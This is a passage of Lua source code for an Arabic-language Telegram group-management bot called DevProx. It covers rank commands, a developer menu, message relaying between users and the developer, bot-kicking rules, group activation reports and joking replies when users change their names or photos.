Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم تنزيلة ❨ '..DEV_ABBAS..' ❩ بنجٱح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") and Abbas_Abs(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم رفعه ❨ '..text1[2]..' ❩ بنجٱح', 1, 'md')
DevAbs:sadd(DevProx..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم رفعه ❨ '..text1[2]..' ❩ بنجٱح', 1, 'md')
DevAbs:sadd(DevProx..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "مدير" and is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم رفعه ❨ '..text1[2]..' ❩ بنجٱح', 1, 'md')
DevAbs:sadd(DevProx..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "عضو" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم رفعه ❨ '..text1[2]..' ❩ بنجٱح', 1, 'md')
end
else
info = "☬︙*ٱڵمعرف غير صحيح*"
Dev_Abs(msg.chat_id_, msg.id_, 1, info, 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") and Abbas_Abs(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم تنزيلة ❨ '..text1[2]..' ❩ بنجٱح', 1, 'md')
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم تنزيلة ❨ '..text1[2]..' ❩ بنجٱح', 1, 'md')
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "مدير" and is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم تنزيلة ❨ '..text1[2]..' ❩ بنجٱح', 1, 'md')
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "عضو" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم تنزيلة ❨ '..text1[2]..' ❩ بنجٱح', 1, 'md')
end
else
info = "☬︙*ٱڵمعرف غير صحيح*"
Dev_Abs(msg.chat_id_, msg.id_, 1, info, 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source DevProx     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevAbs:incr(DevProx..'msg'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'gg' 
elseif id:match("^(%d+)") then
DevAbs:sadd(DevProx..'bot',msg.sender_user_id_)  
Chat_Type = 'pv' 
else
Chat_Type = 'gg' 
end
end 
--     Source DevProx     --
if Chat_Type == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if is_leader(msg) then 
local Sudo_Welcome = '*☬ ︙ مرحبٱ عزيزي ٱڵـمطور \n☬ ︙ ٱنت ٱڵمطور ٱلٱسٱسي هنٱ \n☬ ︙ ٱڵيك ٱزرٱر سورس ديف بروكس \n☬ ︙ تستطيع ٱڵتحكم بكل ٱلٱوٱمر فقط ٱضغط على ٱلٱمر ٱڵذي تريد تنفيذه*'
local key = {
{'وضع اسم البوت','↫ تحديث ☬','ضع كليشه المطور'},
{'↫ الكروبات ☬','↫ المطورين ☬','↫ الاحصائيات ☬'},
{'↫ تعطيل التواصل ☬','↫ تفعيل التواصل ☬'},
{'↫ المجموعات ☬','روابط الكروبات','↫ المشتركين ☬'},
{'تنظيف الكروبات','↫ قائمه العام ☬','تنظيف المشتركين'},
{'↫ اذاعه عام ☬','↫ اذاعه خاص ☬'},
{'↫ اذاعه عام بالتوجيه ☬','↫ اذاعه خاص بالتوجيه ☬'},
{'⌯ ❨ تعيين كلايش الاوامر ❩ ⌯'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'نسخه ملف السورس','تحديث السورس','جلب نسخه الكروبات'},
{'↫ حذف رد عام ☬','↫ الردود العام ☬','↫ اضف رد عام ☬'},
{'↫ حذف اغنيه ☬','↫ الاغاني المضافه ☬','↫ اضف اغنيه ☬'},
{'↫ حذف رد الخاص ☬','↫ تعيين رد الخاص ☬'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغيير كليشه الاشتراك'},
{'↫ تعطيل المغادره ☬','↫ تفعيل المغادره ☬'},
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
if Chat_Type == 'pv' then 
if text == '⌯ ❨ تعيين كلايش الاوامر ❩ ⌯' then 
if is_leader(msg) then 
local Sudo_Welcome = '*☬ ︙ ٱهلٱ بك مجددٱ عزيزي ٱڵـمطور *\n*☬ ︙ ٱڵيك ٱلٱزرٱر ٱڵخٱصه بتعديل وتغيير كلايش سورس ديف بروكس فقط ٱضغط على ٱلٱمر ٱڵذي تريد تنفيذه*'
local key = {
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م5','تعيين امر م4'},
{'تعيين امر م8','تعيين امر م7','تعيين امر م6'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end

if Chat_Type == 'pv' then 
if text == '/start' then  
if not DevAbs:get(DevProx..'Start:Time'..msg.sender_user_id_) then
local inline = {{{text="☬ ︙ ٱڵمطور ︙ ☬",url="t.me/"..(ExDevUser or "Dev_Prox")}}}
local start = DevAbs:get(DevProx.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "☬︙مرحبٱ انا بوت ٱسمي "..name_bot.."\n☬︙ٱختصٱصي حمٱية ٱڵمجموعات\n☬︙من ٱڵتفليش وٱڵسبام وٱڵـخخ .. . ،\n☬︙تفعيڵي سهڵ ومجانا فقط قم برفعي ٱدمن في مجموعتك وٱرسڵ ٱمر ↫ تفعيل\n☬︙سيتم رفع ٱلٱدمنيه وٱڵمنشئ تڵقٱئيٱ"
end 
send_inline(msg.chat_id_,Start_Source,nil,inline)
end
DevAbs:setex(DevProx..'Start:Time'..msg.sender_user_id_,300,true)
return false
end 
end
if text and DevAbs:get(DevProx..'Start:Bots') then
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم ٱڵغاء حفظ كليشة ٱڵستٱرت', 1, 'md')
DevAbs:del(DevProx..'Start:Bots') 
return false
end
DevAbs:set(DevProx.."Start:Bot",text)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حفظ كليشة ٱڵستٱرت', 1, 'md')
DevAbs:del(DevProx..'Start:Bots') 
return false
end
if is_leader(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص ☬' then 
DevAbs:set(DevProx..'Start:Bots',true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱرسـڵ ڵي كليشة ٱڵستٱرت ٱلٱن', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص ☬' then 
DevAbs:del(DevProx..'Start:Bot') 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حذف كليشة ٱڵستٱرت بنجٱح', 1, 'md')
end
if text == 'جلب رد الخاص' then  
local start = DevAbs:get(DevProx.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "☬︙مرحبٱ انا بوت ٱسمي "..name_bot.."\n☬︙ٱختصٱصي حمٱية ٱڵمجموعات\n☬︙من ٱڵتفليش وٱڵسبام وٱڵـخخ .. . ،\n☬︙تفعيڵي سهڵ ومجانا فقط قم برفعي ٱدمن في مجموعتك وٱرسڵ ٱمر ↫ تفعيل\n☬︙سيتم رفع ٱلٱدمنيه وٱڵمنشئ تڵقٱئيٱ"
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
end
--     Source DevProx     --
if Chat_Type == 'pv' then 
if not is_leader(msg) and not DevAbs:sismember(DevProx..'BaN:In:User',msg.sender_user_id_) and not DevAbs:get(DevProx..'Texting:In:Bv') then
Dev_Abs(msg.sender_user_id_, msg.id_, 1, '☬︙تـۖم ٱرسٱڵ رسٱڵتك ٱڵى [ٱڵمطور](t.me/'..ExDevUser..')', 1, 'md') 
tdcli_function({ID ="GetChat",chat_id_=DevId},function(arg,chat)  
tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,ta) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
local Text = '☬︙تـۖم ٱرسٱڵ ٱڵمڵصق من ↫ ⤈\n['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
Dev_Abs(DevId, 0, 1, Text, 1, "md")  
return false
end;end;end,nil);end,nil);end,nil);end,nil);end
if is_leader(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Text = '☬︙ٱڵـعضو ↫ ❨ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..') ❩'..'\n☬︙تـۖم حظرة من ٱڵتوٱصڵ'
Dev_Abs(DevId, 0, 1, Text, 1, "md")  
DevAbs:sadd(DevProx..'BaN:In:User',data.id_)  
return false  
end 
if text == 'الغاء الحظر' then
local Text = '☬︙ٱڵـعضو ↫ ❨ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..') ❩'..'\n☬︙تـۖم ٱڵغٱء حظرة من ٱڵتوٱصڵ'
Dev_Abs(DevId, 0, 1, Text, 1, "md")  
DevAbs:srem(DevProx..'BaN:In:User',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙فشڵ ٱرسٱڵ رسٱڵتك لٱن ٱڵعضو قٱم بحظر ٱڵبوت', 1, 'md')
return false  
end 
if text then
Dev_Abs(id_user, 0, 1, text, 1, "md")  
Text = '☬︙تـۖم ٱرسٱڵ ٱڵرسٱڵة ٱڵى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '☬︙تـۖم ٱرسٱڵ ٱڵمڵصق ٱڵى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '☬︙تـۖم ٱرسٱڵ ٱڵصورة ٱڵى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '☬︙تـۖم ٱرسٱڵ ٱڵمتحركة ٱڵى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '☬︙تـۖم ٱرسٱڵ ٱڵبصمة ٱڵى ↫ ⤈'
end     
Dev_Abs(DevId, 0, 1, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')', 1, "md")  
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
if is_leader(msg) then
if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل ☬' then   
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم تـفعيـۧڵ ٱڵتوٱصڵ بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'Texting:In:Bv') 
end
if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل ☬' then  
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم تـعطيـۧڵ ٱڵتوٱصڵ بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'Texting:In:Bv',true) 
end
end
--     Source DevProx     --
DevAbs:sadd(DevProx.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
DevAbs:incr(DevProx.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
if msg.content_.ID == "MessageChatDeleteMember" then
if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
DevAbs:del(DevProx.."bot:enable:" .. msg.chat_id_)
DevAbs:srem(DevProx.."bot:groups", msg.chat_id_) 
end end 
function chek_admin(chat_id,set) 
local function promote_admin(extra,result,success)   
limit = result.administrator_count_   
if tonumber(limit) > 0 then 
getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
end
end
getChannelFull(chat_id,promote_admin)
end
function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
limit = result.kicked_count_
getChannelMembers(channel, 0, 'Kicked', limit,cb)
end
getChannelFull(channel,callback_admins)
end
function deleteMessagesFromUser(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- vector
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
function getUser(user_id, cb)
    tdcli_function ({
  ID = "GetUser",
  user_id_ = user_id
    }, cb, nil)
  end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(DevProx..'lock:bot:ttt'..bot_id) and not DevAbs:get(DevProx.."lock:bot:ttt2:"..msg.chat_id_) then 
function ABS_PROX(extra,result,success)
if result.id_ then 
local abbs = DevAbs:get("ABS_PROX:name"..result.id_)
if not result.first_name_ then 
if abbs then 
DevAbs:del("ABS_PROX:name"..result.id_) 
end
end
if result.first_name_ then 
if abbs and abbs ~= result.first_name_ then 
local abs_text = {
  "اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
  "وفف اسمكك الجديد يشكك، 🤤♥️ ",
  "ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
  "اسمك الجديد { "..result.first_name_.." }\n فد شي وين زخرفته ؟، 🤤♥️", 
}
abbss = math.random(#abs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abs_text[abbss], 1, 'html')
end  
DevAbs:set("ABS_PROX:name"..result.id_, result.first_name_)  
end
end
end
getUser(msg.sender_user_id_, ABS_PROX)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
DevAbs:set(DevProx.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(DevProx.."bot:bots:ban" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(DevProx.."bot:bots:mute" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(DevProx.."keed_bots"..msg.chat_id_)  and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
DevAbs:sadd(DevProx..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevAbs:sadd(DevProx..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(DevProx) then 
DevAbs:srem("ABS_PROX:addg"..bot_id, msg.chat_id_) 
DevAbs:del(DevProx.."bot:charge:"..msg.chat_id_)
function ABS_PROX(extra,result,success) 
function  reslit(f1,f2)
function DevProx3(t1,t2)
tdcli_function ({ ID = "GetChat", chat_id_ = DevId },function(arg,chat)  
Dev_Abs(tostring((DevAbs:get(DevProx.."bot:leader:gr") or DevId)), 0, 1, "☬︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙ايدي الطردني ↫ ❨ "..msg.sender_user_id_.." ❩\n☬︙معرف الطردني ↫ ❨ @"..(result.username_ or "لا يوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙معلومات المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙اسم المجموعه ↫ ❨ "..f2.title_.." ❩\n☬︙ايدي المجموعه ↫ ⤈ \n❨ "..msg.chat_id_.." ❩\n☬︙تم حذف جميع بياناتها\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙ٱڵوقت ↫ "..os.date("%I:%M%p").." \n☬︙ٱڵتٱريخ ↫ "..os.date("%Y/%m/%d").."" , 1, 'html')
end,nil)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, DevProx3, nil)
end
tdcli_function ({
ID = "GetChat",
chat_id_ = msg.chat_id_
}, reslit, nil) 
end
getUser(msg.sender_user_id_, ABS_PROX)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)    
end   
end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(DevProx..'lock:bot:ttt'..bot_id) and not DevAbs:get(DevProx.."lock:bot:ttt2:"..msg.chat_id_) then  
function ABS_PROX(extra,result,success)
if result.id_ then 
local abbs = DevAbs:get("ABS_PROX:Userr"..result.id_)
if not result.username_ then 
if abbs then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بسرعه، 😹💔 \nهذٱ معرفه @"..abbs.."", 1, 'html')
DevAbs:del("ABS_PROX:Userr"..result.id_) 
end
end
if result.username_ then 
if abbs and abbs ~= result.username_ then 
local abs_text = {
  'معرفك الجديد عشره بربع محد ياخذه😹💔',
  "هاها غيرت معرفك نشروك بقناة فضايح😹💔💭",
  "معرفك الجديد حلو منين خامطه؟!🤤♥️",
  "معرفك القديم @"..result.username_.." ضمه بقناة لاينبعص، 😹♥️",
}
abbss = math.random(#abs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abs_text[abbss], 1, 'html')
end  
DevAbs:set("ABS_PROX:Userr"..result.id_, result.username_) 
end
end
end
getUser(msg.sender_user_id_, ABS_PROX)
end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(DevProx..'lock:bot:ttt'..bot_id) and not DevAbs:get(DevProx.."lock:bot:ttt2:"..msg.chat_id_) then  
function abbs(extra,result,success)
if result.id_ then 
local abbs2 = DevAbs:get("abbs:photo"..result.id_)
if not result.profile_photo_ then 
if abbs2 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "حذف كڵ صوره مضروب بوري، 😹💔", 1, 'html')
DevAbs:del("abbs:photo"..result.id_) 
end
end
if result.profile_photo_ then 
if abbs2 and abbs2 ~= result.profile_photo_.big_.persistent_id_ then 
local abbs_text = {
  "وفف مو صوره غنبلةة، 🤤♥️",
  "طالع صاكك بالصوره الجديده ممكن نرتبط؟ ، 🤤♥️",
  "حطيت صوره جديده عود شوفوني اني صاكك بنات، 😹♥️",
  "اححح شنيي هالصوره الجديده، 🤤♥️",
}
abbs3 = math.random(#abbs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abbs_text[abbs3], 1, 'html')
end  
DevAbs:set("abbs:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end
end
end
getUser(msg.sender_user_id_, abbs)
end
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil) 
end
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
function title_name(GroupID)
tdcli_function({ID ="GetChat",chat_id_=GroupID},function(arg,data)
DevAbs:set(DevProx..'group:name'..GroupID,data.title_) end,nil) return DevAbs:get(DevProx..'group:name'..GroupID) end
--     Source DevProx     --
res = 'https://api.telegram.org/bot'..tokenbot
function Mute_time(chat_id,user_id,time)
local mut = res.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=false&until_date='..time
return https.request(mut)
end
--     Source DevProx     --
function string:split(sep)
local sep, fields = sep or ":", {}
local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
function ababes(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_
if text ==('تفعيل') and not is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'lock:bot:free'..bot_id) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
DevAbs:sadd(DevProx..'abs:admins:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
DevAbs:sadd(DevProx.."abs:monsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if DevAbs:get(DevProx.."bot:enable:"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمجـمۄعة ،بٱڵتاكيد ،مۧفعڵـة', 1, 'md')
else
absmoned(msg.chat_id_, result.id_, msg.id_, '☬︙ٱهلٱ عزيزي ↫ '..CatchName(result.first_name_,15)..' \nڵقد تـۖم تـفعيـۧڵ ٱڵمجـمۄعة بنجٱح \nتم رفع ٱلٱدمنيه وٱڵمنشئ ٱلٱسٱسي \n ✓', 16, utf8.len(CatchName(result.first_name_,15))) 
openChat(msg.chat_id_,ABS_PROX)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
function ABS_PROX(f1,f2)
function DevProx3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "لايوجد")) 
Dev_Abs(tostring((DevAbs:get(DevProx.."bot:leader:gr") or DevId)), 0, 1, "☬︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙ايدي الضافني ↫ ❨ "..msg.sender_user_id_.." ❩\n☬︙معرف الضافني ↫ ❨ @"..(result.username_ or "لا يوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙معلومات المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙اسم المجموعه ↫ ❨ "..f2.title_.." ❩\n☬︙ايدي المجموعه ↫ ⤈ \n❨ "..msg.chat_id_.." ❩\n☬︙رابط المجموعه ↫ ⤈\n❨ "..(t2.invite_link_ or "لايوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙ٱڵوقت ↫ "..os.date("%I:%M%p").." \n☬︙ٱڵتٱريخ ↫ "..os.date("%Y/%m/%d").."" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, DevProx3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
DevAbs:set(DevProx.."bot:enable:"..msg.chat_id_,true)
DevAbs:setex(DevProx.."bot:charge:"..msg.chat_id_,86400,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
end end
getUser(msg.sender_user_id_,adding) 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع تفعيڵ هذه ٱڵمجـمۄعة بسبب تعطيڵ ٱڵبوت الخدمي من قبڵ ٱڵمطور ٱلٱسٱسي', 1, 'md') 
end end end 
--     Source DevProx     --
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
--vardump(data)
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
ababes(data.message_,data) 
--     Source DevProx     --
if msg.date_ < (os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source DevProx     --
local idf = tostring(msg.chat_id_)
